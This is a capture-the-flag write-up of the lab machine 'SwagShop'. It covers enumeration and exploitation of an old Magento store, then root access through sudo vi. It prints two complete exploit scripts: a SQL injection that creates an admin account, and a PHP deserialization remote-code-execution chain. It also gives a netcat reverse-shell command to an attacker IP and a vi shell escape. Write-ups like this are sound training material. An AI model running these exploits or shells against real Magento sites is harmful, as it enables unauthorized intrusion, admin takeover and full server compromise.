
# Table of Contents

1.  [Enumeration](#org524f87c)
    1.  [HTTP\\ 80](#orgcd7ed50)
2.  [PE](#orgaba0d43)



<a id="org524f87c"></a>

# Enumeration

Let's start the work with check scan if the hosts is up

    nmap -sn 10.10.10.140    
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-15 19:19 EST
    Nmap scan report for swagshop.htb (10.10.10.140)
    Host is up (0.034s latency).
    Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds

Now we can try other type of scan for enumerate the ports

    udo nmap -sC -sV 10.10.10.140
    Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-15 19:14 EST
    Nmap scan report for 10.10.10.140
    Host is up (0.036s latency).
    Not shown: 998 closed tcp ports (reset)
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)
    |   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)
    |_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: Did not follow redirect to http://swagshop.htb/
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds

Now we can add the domanains to our `/etc/hosts` and open the browser.


<a id="orgcd7ed50"></a>

## HTTP\\ 80

We should find more info so we run `whatweb`

      <SNIP>
    
    [ Magento ]
            Opensource ecommerce platform written in PHP 
    
            {:name=>"Meta keywords", :certainty=>100}
            {:certainty=>100}
            {:name=>"cookie called frontend", :certainty=>100}
            Google Dorks: (2)
            Website     : http://www.magentocommerce.com
    
    [ Modernizr ]
            Modernizr adds classes to the <html> element which allow 
            you to target specific browser functionality in your 
            stylesheet. You don't actually need to write any Javascript 
            to use it. [JavaScript] 
    
            {:certainty=>100}
            Website     : http://www.modernizr.com/
    
    [ Prototype ]
            Javascript library 
    
            {:name=>"js tag", :certainty=>100}
    
    [ Script ]
            This plugin detects instances of script HTML elements and 
            returns the script language/type. 
    
            {:certainty=>100}
            String       : text/javascript
            {:certainty=>100, :string=>["text/javascript"]}
    
    [ Scriptaculous ]
            Javascript library 
    
            {:certainty=>100}
    
    [ X-Frame-Options ]
            This plugin retrieves the X-Frame-Options value from the 
            HTTP header. - More Info: 
            http://msdn.microsoft.com/en-us/library/cc288472%28VS.85%29.
            aspx
    
            String       : SAMEORIGIN
            {:certainty=>100, :string=>"SAMEORIGIN"}
    
    HTTP Headers:
            HTTP/1.1 200 OK
            Date: Sat, 16 Dec 2023 00:35:41 GMT
            Server: Apache/2.4.29 (Ubuntu)
            Set-Cookie: frontend=50euiiu1usongv06n297uam2c1; expires=Sat, 16-Dec-2023 01:35:41 GMT; Max-Age=3600; path=/; domain=swagshop.htb; HttpOnly
            Expires: Thu, 19 Nov 1981 08:52:00 GMT
            Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
            Pragma: no-cache
            X-Frame-Options: SAMEORIGIN
            Vary: Accept-Encoding
            Content-Encoding: gzip
            Content-Length: 3423
            Connection: close
            Content-Type: text/html; charset=UTF-8

As we can se the host run `Magento` a very vulnarble CMS for E-Commerce.

Now we can search some exploit.

    searchsploit Magento         
    ------------------------------------------------------------------ ---------------------------------
     Exploit Title                                                    |  Path
    ------------------------------------------------------------------ ---------------------------------
    eBay Magento 1.9.2.1 - PHP FPM XML eXternal Entity Injection      | php/webapps/38573.txt
    eBay Magento CE 1.9.2.1 - Unrestricted Cron Script (Code Executio | php/webapps/38651.txt
    Magento 1.2 - '/app/code/core/Mage/Admin/Model/Session.php?login[ | php/webapps/32808.txt
    Magento 1.2 - '/app/code/core/Mage/Adminhtml/controllers/IndexCon | php/webapps/32809.txt
    Magento 1.2 - 'downloader/index.php' Cross-Site Scripting         | php/webapps/32810.txt
    Magento < 2.0.6 - Arbitrary Unserialize / Arbitrary Write File    | php/webapps/39838.php
    Magento CE < 1.9.0.1 - (Authenticated) Remote Code Execution      | php/webapps/37811.py
    Magento eCommerce - Local File Disclosure                         | php/webapps/19793.txt
    Magento eCommerce - Remote Code Execution                         | xml/webapps/37977.py
    Magento eCommerce CE v2.3.5-p2 - Blind SQLi                       | php/webapps/50896.txt
    Magento Server MAGMI Plugin - Multiple Vulnerabilities            | php/webapps/35996.txt
    Magento Server MAGMI Plugin 0.7.17a - Remote File Inclusion       | php/webapps/35052.txt
    Magento WooCommerce CardGate Payment Gateway 2.0.30 - Payment Pro | php/webapps/48135.php
    ------------------------------------------------------------------ ---------------------------------
    Shellcodes: No Results

Evrything that presents `RCE` as a good staff!

Posthumously, I can tell you that after time trying POCs I realized that they needed modifications and that just one for our purpose was not enough.
I will now explain the process.
At first we will use that `xml/webapps/37977.py`

    #!/usr/share/bin python2
    
    import requests
    import base64
    import sys
    
    target = "http://10.10.10.140/index.php"
    
    if not target.startswith("http"):
        target = "http://" + target
    
    if target.endswith("/"):
        target = target[:-1]
    
    target_url = target + "/admin/Cms_Wysiwyg/directive/index/"
    
    q="""
    SET @SALT = 'rp';
    SET @PASS = CONCAT(MD5(CONCAT( @SALT , '{password}') ), CONCAT(':', @SALT ));
    SELECT @EXTRA := MAX(extra) FROM admin_user WHERE extra IS NOT NULL;
    INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,`created`,`lognum`,`reload_acl_flag`,`is_active`,`extra`,`rp_token`,`rp_token_created_at`) VALUES ('Firstname','Lastname','email@example.com','{username}',@PASS,NOW(),0,0,1,@EXTRA,NULL, NOW());
    INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
    """
    
    
    query = q.replace("\n", "").format(username="forme", password="forme")
    pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
    
    # e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
    r = requests.post(target_url,
                      data={"___directive": "e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ",
                            "filter": base64.b64encode(pfilter),
                            "forwarded": 1})
    if r.ok:
        print "WORKED"
        print "Check {0}/admin with creds forme:forme".format(target)
    else:
    print "DID NOT WORK"

    python2 xml/webapps/37977.py
    WORKED
    Check http://10.10.10.140/index.php/admin with creds forme:forme

and in second with this credential we can use that `php/webapps/37811.py` but whit a simple modify

    #!/usr/share/bin python2
    
    from hashlib import md5
    import sys
    import re
    import base64
    import mechanize
    
    
    def usage():
        print "Usage: python %s <target> <argument>\nExample: python %s http://localhost \"uname -a\""
        sys.exit()
    
    
    if len(sys.argv) != 3:
        usage()
    
    # Command-line args
    target = sys.argv[1]
    arg = sys.argv[2]
    
    # Config.
    username = 'forme'
    password = 'forme'
    php_function = 'system'  # Note: we can only pass 1 argument to the function
    install_date = 'Wed, 08 May 2019 07:23:09 +0000'  # This needs to be the exact date from /app/etc/local.xml
    
    # POP chain to pivot into call_user_exec
    payload = 'O:8:\"Zend_Log\":1:{s:11:\"\00*\00_writers\";a:2:{i:0;O:20:\"Zend_Log_Writer_Mail\":4:{s:16:' \
              '\"\00*\00_eventsToMail\";a:3:{i:0;s:11:\"EXTERMINATE\";i:1;s:12:\"EXTERMINATE!\";i:2;s:15:\"' \
              'EXTERMINATE!!!!\";}s:22:\"\00*\00_subjectPrependText\";N;s:10:\"\00*\00_layout\";O:23:\"'     \
              'Zend_Config_Writer_Yaml\":3:{s:15:\"\00*\00_yamlEncoder\";s:%d:\"%s\";s:17:\"\00*\00'     \
              '_loadedSection\";N;s:10:\"\00*\00_config\";O:13:\"Varien_Object\":1:{s:8:\"\00*\00_data\"' \
              ';s:%d:\"%s\";}}s:8:\"\00*\00_mail\";O:9:\"Zend_Mail\":0:{}}i:1;i:2;}}' % (len(php_function), php_function,
                                                                                         len(arg), arg)
    # Setup the mechanize browser and options
    br = mechanize.Browser()
    #br.set_proxies({"http": "localhost:8080"})
    br.set_handle_robots(False)
    
    request = br.open(target)
    
    br.select_form(nr=0)
    # br.form.new_control('text', 'login[username]', {'value': username})  # Comment that
    br.form.fixup()
    br['login[username]'] = username
    br['login[password]'] = password
    
    br.method = "POST"
    request = br.submit()
    content = request.read()
    
    url = re.search("ajaxBlockUrl = \'(.*)\'", content)
    url = url.group(1)
    key = re.search("var FORM_KEY = '(.*)'", content)
    key = key.group(1)
    
    request = br.open(url + 'block/tab_orders/period/7d/?isAjax=true', data='isAjax=false&form_key=' + key)
    tunnel = re.search("src=\"(.*)\?ga=", request.read())
    tunnel = tunnel.group(1)
    
    payload = base64.b64encode(payload)
    gh = md5(payload + install_date).hexdigest()
    
    exploit = tunnel + '?ga=' + payload + '&h=' + gh
    
    try:
        request = br.open(exploit)
    except (mechanize.HTTPError, mechanize.URLError) as e:
    print e.read()

we will get an unstable shell that we should immediately change to a reverse shell.

<span class="underline">Listner Kali</span>

    python3 -m pwncat -lp 7777

<span class="underline">Unstable shell</span>

    python2 php/webapps/37811.py http://swagshop.htb/index.php/admin "busybox nc 10.10.14.3 6666 -e sh"


<a id="orgaba0d43"></a>

# PE

inside the car using `sudo -l` we realize that something is wrong.

    (remote) www-data@swagshop:/home/haris$ sudo -l 
    Matching Defaults entries for www-data on swagshop:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User www-data may run the following commands on swagshop:
    (root) NOPASSWD: /usr/bin/vi /var/www/html/*

We can run <span class="underline">vi,</span> as the `root` user, in the `/var/www/html/*` folder and for those who know `vi` or `vim` know that is a problem because of the existence of the `:sh` `:shell` commands so run:

    (remote) www-data@swagshop:/home/haris$ sudo vi /var/www/html/api.php 

Type ESC `:shell` and the game is done!

    root@swagshop:/home/haris# id
    uid=0(root) gid=0(root) groups=0(root)

